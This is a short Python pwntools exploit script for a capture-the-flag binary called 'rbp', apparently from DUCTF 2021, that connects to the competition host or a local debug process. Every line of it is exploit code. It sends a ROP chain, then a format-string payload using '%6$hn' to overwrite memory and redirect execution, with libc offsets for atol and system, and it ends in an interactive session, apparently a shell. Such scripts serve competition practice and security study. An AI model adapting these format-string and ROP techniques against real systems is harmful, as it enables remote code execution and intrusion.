from pwn import *

debug = True

if(debug):
	r = process("./rbp")
	gdb.attach(r)
	atol_off = 0x0000000000047750
	system_off = 0x0000000000055410
else:
	r = remote("pwn-2021.duc.tf", 31910)
	atol_off = 0x0000000000042210
	system_off = 0x000000000004fa60


r.recvuntil(b'Hi there! What is your name?')

atol_got = 0x000000000404038
main = 0x4011d5
pop_rbp_pop2_ret = 0x00000000004012af
pop3_ret = 0x00000000004012ae
printf = 0x401040
fini = 0x403e08
start = 0x401080

payload1 = p64(printf) + p64(pop3_ret) + p64(fini) 
r.send(payload1) 
r.recvuntil(b'Do you have a favourite number?')

payload2 = b"-72\x00" + b"%4224x" + b"%6$hn" 
payload2 += b'a'*(0x10 - len(payload2)) 
payload2 += p64(pop3_ret)[:3]
r.send(payload2)

r.interactive()

